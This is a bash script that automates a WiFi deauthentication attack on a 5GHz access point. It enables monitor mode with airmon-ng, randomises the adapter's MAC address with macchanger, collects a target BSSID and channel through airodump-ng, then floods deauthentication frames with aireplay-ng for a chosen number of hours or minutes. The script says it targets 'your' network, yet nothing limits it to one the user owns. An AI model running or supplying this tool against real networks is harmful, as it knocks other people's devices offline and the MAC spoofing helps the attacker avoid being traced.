#!/bin/bash
#Creator: David Parra-Sandoval
#created: 10/21/2020
#Last modified: 20/22/2020
clear

if [[ ${UID} -ne 0 ]]; then
exit 1
fi

echo "This script will deauthenticate all clients in your 5GHz wifi network"
echo "Using a timer that will run for minutes or hours!"
echo
echo "First lets select your wireless adapter to enable monitor mode."
echo "To gather the info about your 5GHz AP/router:"
echo
echo "enp=Ethernet wl=wireless lo=Loopback"
select wifi in $(ls /sys/class/net); do
mon=$wifi
read -p "Use $wifi:? [y/n] "
case $REPLY in
y|Y) break;;
n|N) echo re-select:;;
*) echo "Only y,Y,n,N";;
esac
done
sudo airmon-ng start $mon
mon0=$(ip a | grep wl | cut -d ":" -f2)
sudo macchanger -A $mon0 
clear
echo "Xterm will launch to input your AP/router info"
read -p "PRESS ENTER"
exec xterm -hold -e sudo airodump-ng --band a $mon0 &
clear
PID=$!
until [[ $INFO = [yY]* ]]; do
read -p "Whats your BSSID: " BSSID
echo
read -p "Whats your CH: " CH
echo
read -p "Is this correct?: [y/n] " INFO
clear
done
kill $PID
clear
exec xterm -iconic -e sudo airodump-ng --band a -c $CH $mon0 &
sleep .5
kill $!
until [[ $INFO2 = [yY]* ]]; do
echo "Deauthenticate your wifi network for:"
read -p "[H]ours or [M]inutes?: "
echo
clear
case $REPLY in
h|H) read -p "How many Hours: " HOUR
echo
HOURS=$(( 60 * $HOUR * 60 ))
TIME=$HOURS
echo "Your 5GHz wifi network will disconnect all associated"
echo "clients for $HOURS seconds"
;;

m|M) read -p "How many Minutes: " min
echo
MINUTES=$(( 60 * $min ))
TIME=$MINUTES
echo "Your 5GHz wifi network will disconnect all associated"
echo "clients for $MINUTES seconds"
;;

*) echo "Not valid use m,M,h,H"
;;
esac
echo
read -p "Is this correct?: [y/n] " INFO2
done
clear
export TIME
sed -i "s/time/$TIME/" timer.sh
sleep 1
exec sudo xterm -geometry 60x2 -e ./timer.sh &
sleep .5
exec xterm -e sed -i "s/$TIME/time/" timer.sh &
sudo aireplay-ng -D --deauth 0 -a $BSSID $mon0
 








 

